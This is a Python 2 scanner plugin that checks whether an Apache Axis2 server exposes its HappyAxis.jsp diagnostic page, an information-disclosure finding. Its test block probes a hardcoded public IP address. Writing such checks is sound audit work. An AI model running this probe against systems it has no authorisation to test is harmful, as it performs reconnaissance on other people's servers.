#coding:utf-8
from ..t import T
import urllib2



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        vul_url = target_url + "/axis2/axis2-web/HappyAxis.jsp"
        response=None
        try:
            response=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = response.read()
        except:
            return result
        finally:
            if response is not None:
                response.close()
                del response
        if "Axis2 Happiness Page" in res_html:
            info = vul_url + " Axis Information Disclosure"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='Axis Information Disclosure'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = 'info'
        return result

           

if __name__ == '__main__':
    print P().verify(ip='222.29.81.19',port='8080')          